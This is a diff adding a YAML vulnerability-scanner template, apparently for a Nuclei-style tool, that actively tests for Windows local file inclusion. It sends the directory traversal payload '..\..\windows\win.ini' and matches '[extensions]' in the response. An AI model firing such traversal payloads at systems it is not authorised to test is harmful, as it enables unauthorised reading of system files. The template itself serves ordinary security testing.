@@ -1,0 +1,21 @@
+id: patt-lfi-win-01-path
+name: 'PATT lfi patt-lfi-win-01 via path'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+requires:
+  - dotnet
+description: 'PATT Windows Files win.ini. [patt:patt-lfi-win-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - '..\..\windows\win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
